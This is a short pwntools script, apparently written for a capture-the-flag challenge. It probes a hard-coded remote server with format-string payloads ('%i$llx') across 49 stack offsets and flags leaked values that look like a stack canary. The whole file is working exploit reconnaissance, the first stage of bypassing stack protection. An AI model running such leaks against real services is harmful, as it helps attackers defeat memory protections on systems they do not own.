from pwn import *

# Test a wider range
for i in range(1, 50):
    p = remote("34.185.160.224",31518)
    p.recvuntil(b"town?\n")
    p.sendline(f"%{i}$llx".encode())  # Use %llx to get full 64-bit hex
    p.recvline()
    response = p.recvline()
    if b"0x" in response:
        leaked = response
        value = leaked.decode()
        # Check if it looks like a canary (ends in 00)
        if len(value) >= 14 and value[-2:] == '00':
            print(f"[{i:2d}] 0x{value} <- POSSIBLE CANARY")
        else:
            print(f"[{i:2d}] 0x{value}")
    else:
        print(f"[{i:2d}] {response.strip()}")
    p.close()